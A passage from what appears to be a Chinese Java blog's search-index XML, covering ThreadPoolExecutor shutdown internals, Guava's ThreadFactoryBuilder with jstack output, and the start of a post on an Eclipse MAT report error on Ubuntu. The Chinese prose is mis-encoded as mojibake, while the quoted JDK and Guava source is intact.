<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Drains the task queue into a new list, normally using</span></span><br><span class="line"><span class="comment">    * drainTo. But if the queue is a DelayQueue or any other kind of</span></span><br><span class="line"><span class="comment">    * queue for which poll or drainTo may fail to remove some</span></span><br><span class="line"><span class="comment">    * elements, it deletes them one by one.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> List&lt;Runnable&gt; <span class="title">drainQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       BlockingQueue&lt;Runnable&gt; q = workQueue;</span><br><span class="line">       ArrayList&lt;Runnable&gt; taskList = <span class="keyword">new</span> ArrayList&lt;Runnable&gt;();</span><br><span class="line">       q.drainTo(taskList);</span><br><span class="line">       <span class="keyword">if</span> (!q.isEmpty()) &#123;</span><br><span class="line">           <span class="keyword">for</span> (Runnable r : q.toArray(<span class="keyword">new</span> Runnable[<span class="number">0</span>])) &#123;</span><br><span class="line">               <span class="keyword">if</span> (q.remove(r))</span><br><span class="line">                   taskList.add(r);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> taskList;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>javaä¸­çº¿ç¨‹çš„åœæ­¢æ˜¯åä½œå¼çš„ï¼Œçº¿ç¨‹è¦ä¸»åŠ¨æ£€æŸ¥<code>interrupted</code>çŠ¶æ€ï¼Œå¹¶åšå‡ºå“åº”æ‰èƒ½æ­£ç¡®é€€å‡ºã€‚</p>
<h3 id="JVMé€€å‡º"><a href="#JVMé€€å‡º" class="headerlink" title="JVMé€€å‡º"></a>JVMé€€å‡º</h3><ul>
<li>éå®ˆæŠ¤çº¿ç¨‹</li>
</ul>
<p>å¦‚æœçº¿ç¨‹æ± é‡Œçš„çº¿ç¨‹æ˜¯éå®ˆæŠ¤çº¿ç¨‹ï¼Œ JVMä¼šç­‰å¾…çº¿ç¨‹çš„é€€å‡ºï¼Œç„¶åæ‰ä¼šçœŸæ­£çš„æ¨å‡ºã€‚</p>
<ul>
<li>å®ˆæŠ¤çº¿ç¨‹ï¼ˆä¸æ¨èï¼‰</li>
</ul>
<p>JVMé€€å‡ºçš„æ—¶å€™ä¸ä¼šç­‰å¾…å®ˆæŠ¤çº¿ç¨‹ï¼Œå› æ­¤å¦‚æœè¦ç­‰å¾…æ‰€æœ‰çš„ä»»åŠ¡æ‰§è¡Œå®Œåå†é€€å‡ºï¼Œéœ€è¦è‡ªå·±ä»£ç å¤„ç†, å¯ä»¥ä½¿ç”¨<code>awaitTermination</code>æ–¹æ³•ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">awaitTermination</span><span class="params">(<span class="keyword">long</span> timeout, TimeUnit unit)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> nanos = unit.toNanos(timeout);</span><br><span class="line">        <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">        mainLock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="keyword">if</span> (runStateAtLeast(ctl.get(), TERMINATED))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">if</span> (nanos &lt;= <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                nanos = termination.awaitNanos(nanos);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            mainLock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>termination</code>æ˜¯ç»“æŸçš„æ¡ä»¶é˜Ÿåˆ—</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Lock held on access to workers set and related bookkeeping.</span></span><br><span class="line"><span class="comment"> * While we could use a concurrent set of some sort, it turns out</span></span><br><span class="line"><span class="comment"> * to be generally preferable to use a lock. Among the reasons is</span></span><br><span class="line"><span class="comment"> * that this serializes interruptIdleWorkers, which avoids</span></span><br><span class="line"><span class="comment"> * unnecessary interrupt storms, especially during shutdown.</span></span><br><span class="line"><span class="comment"> * Otherwise exiting threads would concurrently interrupt those</span></span><br><span class="line"><span class="comment"> * that have not yet interrupted. It also simplifies some of the</span></span><br><span class="line"><span class="comment"> * associated statistics bookkeeping of largestPoolSize etc. We</span></span><br><span class="line"><span class="comment"> * also hold mainLock on shutdown and shutdownNow, for the sake of</span></span><br><span class="line"><span class="comment"> * ensuring workers set is stable while separately checking</span></span><br><span class="line"><span class="comment"> * permission to interrupt and actually interrupting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Wait condition to support awaitTermination</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Condition termination = mainLock.newCondition();</span><br></pre></td></tr></table></figure>
<p>çº¿ç¨‹æ± åœ¨é€€å‡ºçš„æ—¶å€™ä¼šå”¤é†’ç­‰å¾…åœ¨è¿™ä¸ªé˜Ÿåˆ—ä¸Šçš„çº¿ç¨‹ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">tryTerminate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="keyword">int</span> c = ctl.get();</span><br><span class="line">            <span class="keyword">if</span> (isRunning(c) ||</span><br><span class="line">                runStateAtLeast(c, TIDYING) ||</span><br><span class="line">                (runStateOf(c) == SHUTDOWN &amp;&amp; ! workQueue.isEmpty()))</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">if</span> (workerCountOf(c) != <span class="number">0</span>) &#123; <span class="comment">// Eligible to terminate</span></span><br><span class="line">                interruptIdleWorkers(ONLY_ONE);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">            mainLock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ctl.compareAndSet(c, ctlOf(TIDYING, <span class="number">0</span>))) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        terminated();</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        ctl.set(ctlOf(TERMINATED, <span class="number">0</span>));</span><br><span class="line">                        termination.signalAll(); <span class="comment">// å”¤é†’ç­‰å¾…åœ¨è¿™ä¸ªæ¡ä»¶ä¸Šçš„çº¿ç¨‹</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                mainLock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// else retry on failed CAS</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>çº¿ç¨‹æ± çŠ¶æ€:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * The run state of this task, initially NEW.  The run state</span></span><br><span class="line"><span class="comment">    * transitions to a terminal state only in methods set,</span></span><br><span class="line"><span class="comment">    * setException, and cancel.  During completion, state may take on</span></span><br><span class="line"><span class="comment">    * transient values of COMPLETING (while outcome is being set) or</span></span><br><span class="line"><span class="comment">    * INTERRUPTING (only while interrupting the runner to satisfy a</span></span><br><span class="line"><span class="comment">    * cancel(true)). Transitions from these intermediate to final</span></span><br><span class="line"><span class="comment">    * states use cheaper ordered/lazy writes because values are unique</span></span><br><span class="line"><span class="comment">    * and cannot be further modified.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * Possible state transitions:</span></span><br><span class="line"><span class="comment">    * NEW -&gt; COMPLETING -&gt; NORMAL</span></span><br><span class="line"><span class="comment">    * NEW -&gt; COMPLETING -&gt; EXCEPTIONAL</span></span><br><span class="line"><span class="comment">    * NEW -&gt; CANCELLED</span></span><br><span class="line"><span class="comment">    * NEW -&gt; INTERRUPTING -&gt; INTERRUPTED</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">int</span> state;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> NEW          = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> COMPLETING   = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> NORMAL       = <span class="number">2</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> EXCEPTIONAL  = <span class="number">3</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CANCELLED    = <span class="number">4</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> INTERRUPTING = <span class="number">5</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> INTERRUPTED  = <span class="number">6</span>;</span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><a href="http://cdn2.jianshu.io/p/c079d59ba7c8" rel="external nofollow noopener noreferrer" target="_blank">æ‹†è½®å­ï¼šå…¨é¢å‰–æ ThreadPoolExecutorï¼ˆ2ï¼‰-ä¼—äººæ‹¾æŸ´ - ç®€ä¹¦</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> executor </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Guavaä¸­çš„ThreadFactoryBuilder]]></title>
      <url>http://qsli.github.io/2017/11/18/ThreadFactoryBuilder/</url>
      <content type="html"><![CDATA[<h2 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h2><p>javaä¸­è‡ªå®šä¹‰çº¿ç¨‹æ± æ—¶å¯ä»¥ä¼ å…¥ä¸€ä¸ª<code>ThreadFactory</code>ï¼Œç”¨æ¥åˆ›å»ºçº¿ç¨‹ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Creates a new &#123;<span class="doctag">@code</span> ThreadPoolExecutor&#125; with the given initial</span></span><br><span class="line"><span class="comment">    * parameters and default rejected execution handler.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> corePoolSize the number of threads to keep in the pool, even</span></span><br><span class="line"><span class="comment">    *        if they are idle, unless &#123;<span class="doctag">@code</span> allowCoreThreadTimeOut&#125; is set</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> maximumPoolSize the maximum number of threads to allow in the</span></span><br><span class="line"><span class="comment">    *        pool</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> keepAliveTime when the number of threads is greater than</span></span><br><span class="line"><span class="comment">    *        the core, this is the maximum time that excess idle threads</span></span><br><span class="line"><span class="comment">    *        will wait for new tasks before terminating.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> unit the time unit for the &#123;<span class="doctag">@code</span> keepAliveTime&#125; argument</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> workQueue the queue to use for holding tasks before they are</span></span><br><span class="line"><span class="comment">    *        executed.  This queue will hold only the &#123;<span class="doctag">@code</span> Runnable&#125;</span></span><br><span class="line"><span class="comment">    *        tasks submitted by the &#123;<span class="doctag">@code</span> execute&#125; method.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> threadFactory the factory to use when the executor</span></span><br><span class="line"><span class="comment">    *        creates a new thread</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> IllegalArgumentException if one of the following holds:&lt;br&gt;</span></span><br><span class="line"><span class="comment">    *         &#123;<span class="doctag">@code</span> corePoolSize &lt; 0&#125;&lt;br&gt;</span></span><br><span class="line"><span class="comment">    *         &#123;<span class="doctag">@code</span> keepAliveTime &lt; 0&#125;&lt;br&gt;</span></span><br><span class="line"><span class="comment">    *         &#123;<span class="doctag">@code</span> maximumPoolSize &lt;= 0&#125;&lt;br&gt;</span></span><br><span class="line"><span class="comment">    *         &#123;<span class="doctag">@code</span> maximumPoolSize &lt; corePoolSize&#125;</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> NullPointerException if &#123;<span class="doctag">@code</span> workQueue&#125;</span></span><br><span class="line"><span class="comment">    *         or &#123;<span class="doctag">@code</span> threadFactory&#125; is null</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">ThreadPoolExecutor</span><span class="params">(<span class="keyword">int</span> corePoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">int</span> maximumPoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">long</span> keepAliveTime,</span></span></span><br><span class="line"><span class="function"><span class="params">                             TimeUnit unit,</span></span></span><br><span class="line"><span class="function"><span class="params">                             BlockingQueue&lt;Runnable&gt; workQueue,</span></span></span><br><span class="line"><span class="function"><span class="params">                             ThreadFactory threadFactory)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">this</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue,</span><br><span class="line">            threadFactory, defaultHandler);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p><code>ThreadFactory</code>æ¥å£åªæœ‰ä¸€ä¸ªæ–¹æ³•ï¼Œå°±æ˜¯åˆ›å»ºçº¿ç¨‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ThreadFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructs a new &#123;<span class="doctag">@code</span> Thread&#125;.  Implementations may also initialize</span></span><br><span class="line"><span class="comment">     * priority, name, daemon status, &#123;<span class="doctag">@code</span> ThreadGroup&#125;, etc.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> r a runnable to be executed by new thread instance</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> constructed thread, or &#123;<span class="doctag">@code</span> null&#125; if the request to</span></span><br><span class="line"><span class="comment">     *         create a thread is rejected</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">Thread <span class="title">newThread</span><span class="params">(Runnable r)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ›å»º<code>Thread</code>æ—¶å¯ä»¥è®¾ç½®ä¸€äº›åˆ—çš„å±æ€§ï¼Œ å±æ€§æ¯”è¾ƒå¤šï¼Œäºæ˜¯<code>guava</code>é‡Œæœ‰ä¸€ä¸ªä¾¿åˆ©ç±» â€”â€”â€”â€” <code>ThreadFactoryBuilder</code>ã€‚</p>
<p>ç›´æ¥çœ‹<code>build</code>æ–¹æ³•:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> ThreadFactory <span class="title">build</span><span class="params">(ThreadFactoryBuilder builder)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> String nameFormat = builder.nameFormat;</span><br><span class="line">    <span class="keyword">final</span> Boolean daemon = builder.daemon;</span><br><span class="line">    <span class="keyword">final</span> Integer priority = builder.priority;</span><br><span class="line">    <span class="keyword">final</span> UncaughtExceptionHandler uncaughtExceptionHandler =</span><br><span class="line">        builder.uncaughtExceptionHandler;</span><br><span class="line">    <span class="keyword">final</span> ThreadFactory backingThreadFactory =</span><br><span class="line">        (builder.backingThreadFactory != <span class="keyword">null</span>)</span><br><span class="line">        ? builder.backingThreadFactory</span><br><span class="line">        : Executors.defaultThreadFactory();</span><br><span class="line">    <span class="keyword">final</span> AtomicLong count = (nameFormat != <span class="keyword">null</span>) ? <span class="keyword">new</span> AtomicLong(<span class="number">0</span>) : <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ThreadFactory() &#123;</span><br><span class="line">      <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> Thread <span class="title">newThread</span><span class="params">(Runnable runnable)</span> </span>&#123;</span><br><span class="line">        Thread thread = backingThreadFactory.newThread(runnable);</span><br><span class="line">        <span class="keyword">if</span> (nameFormat != <span class="keyword">null</span>) &#123;</span><br><span class="line">          thread.setName(format(nameFormat, count.getAndIncrement()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (daemon != <span class="keyword">null</span>) &#123;</span><br><span class="line">          thread.setDaemon(daemon);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (priority != <span class="keyword">null</span>) &#123;</span><br><span class="line">          thread.setPriority(priority);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (uncaughtExceptionHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">          thread.setUncaughtExceptionHandler(uncaughtExceptionHandler);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> thread;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨èµ·æ¥æŒºé¡ºæ‰‹çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ThreadPoolExecutor executor = <span class="keyword">new</span> ThreadPoolExecutor(</span><br><span class="line">          <span class="number">10</span>,</span><br><span class="line">          <span class="number">15</span>,</span><br><span class="line">          <span class="number">10</span>,</span><br><span class="line">          TimeUnit.SECONDS,</span><br><span class="line">          blockingQueue,</span><br><span class="line">          <span class="keyword">new</span> ThreadFactoryBuilder().setNameFormat(<span class="string">"guava-%d"</span>).build(),</span><br><span class="line">          <span class="keyword">new</span> ThreadPoolExecutor.DiscardPolicy()</span><br><span class="line">  );</span><br></pre></td></tr></table></figure>
<p>ä¸»è¦å°±æ˜¯ç»™çº¿ç¨‹æ•´ä¸€ä¸ªåå­—ï¼Œç”¨<code>jstack</code>ç­‰å·¥å…·æ’æŸ¥é—®é¢˜æ—¶æ–¹ä¾¿çŸ¥é“æ˜¯å“ªä¸ªçº¿ç¨‹æ± é‡Œçš„ã€‚</p>
<p><code>jstack</code>çš„ç»“æœï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&quot;guava-9&quot; #19 prio=5 os_prio=0 tid=0x00007f5024468000 nid=0x5e3b waiting on condition [0x00007f50104f7000]</span><br><span class="line">   java.lang.Thread.State: WAITING (parking)</span><br><span class="line">        at sun.misc.Unsafe.park(Native Method)</span><br><span class="line">        - parking to wait for  &lt;0x00000000d709af38&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)</span><br><span class="line">        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)</span><br><span class="line">        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)</span><br><span class="line">        at java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:403)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:745)</span><br></pre></td></tr></table></figure>
<h2 id="æ›´å¤š"><a href="#æ›´å¤š" class="headerlink" title="æ›´å¤š"></a>æ›´å¤š</h2><ol>
<li><a href="http://www.importnew.com/20263.html" rel="external nofollow noopener noreferrer" target="_blank">ExecutorService-10ä¸ªè¦è¯€å’ŒæŠ€å·§ - ImportNew</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> guava </category>
            
        </categories>
        
        
        <tags>
            
            <tag> concurrent </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MAT-Ubuntuæ— æ³•æ‰“å¼€Report]]></title>
      <url>http://qsli.github.io/2017/11/12/MAT-Ubuntu/</url>
      <content type="html"><![CDATA[<h2 id="ç°è±¡"><a href="#ç°è±¡" class="headerlink" title="ç°è±¡"></a>ç°è±¡</h2><p>å¯ä»¥è¿è¡Œ<code>Leak Suspects</code>ï¼Œå¯ä»¥çœ‹åˆ°æŠ¥å‘Šæ–‡ä»¶ç¡®å®ç”Ÿæˆäº†ï¼Œä½†æ˜¯æ— æ³•æ‰“å¼€ï¼Œçœ‹error logå¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Unhandled event loop exception</span><br><span class="line"></span><br><span class="line">org.eclipse.swt.SWTException: Failed to execute runnable (org.eclipse.swt.SWTError: No more handles [Browser style SWT.MOZILLA and Java system property org.eclipse.swt.browser.DefaultType=mozilla are not supported with GTK 3 as XULRunner is not ported for GTK 3 yet])</span><br><span class="line">	at org.eclipse.swt.SWT.error(SWT.java:4491)</span><br><span class="line">	at org.eclipse.swt.SWT.error(SWT.java:4406)</span><br><span class="line">	at org.eclipse.swt.widgets.Synchronizer.runAsyncMessages(Synchronizer.java:138)</span><br><span class="line">	at org.eclipse.swt.widgets.Display.runAsyncMessages(Display.java:3794)</span><br><span class="line">	at org.eclipse.swt.widgets.Display.readAndDispatch(Display.java:3433)</span><br><span class="line">	at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine$4.run(PartRenderingEngine.java:1127)</span><br><span class="line">	at org.eclipse.core.databinding.observable.Realm.runWithDefault(Realm.java:337)</span><br><span class="line">	at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.run(PartRenderingEngine.java:1018)</span><br><span class="line">	at org.eclipse.e4.ui.internal.workbench.E4Workbench.createAndRunUI(E4Workbench.java:156)</span><br><span class="line">	at org.eclipse.ui.internal.Workbench$5.run(Workbench.java:694)</span><br><span class="line">	at org.eclipse.core.databinding.observable.Realm.runWithDefault(Realm.java:337)</span><br><span class="line">	at org.eclipse.ui.internal.Workbench.createAndRunWorkbench(Workbench.java:606)</span><br><span class="line">	at org.eclipse.ui.PlatformUI.createAndRunWorkbench(PlatformUI.java:150)</span><br><span class="line">	at org.eclipse.mat.ui.rcp.Application.start(Application.java:26)</span><br><span class="line">	at org.eclipse.equinox.internal.app.EclipseAppHandle.run(EclipseAppHandle.java:196)</span><br><span class="line">	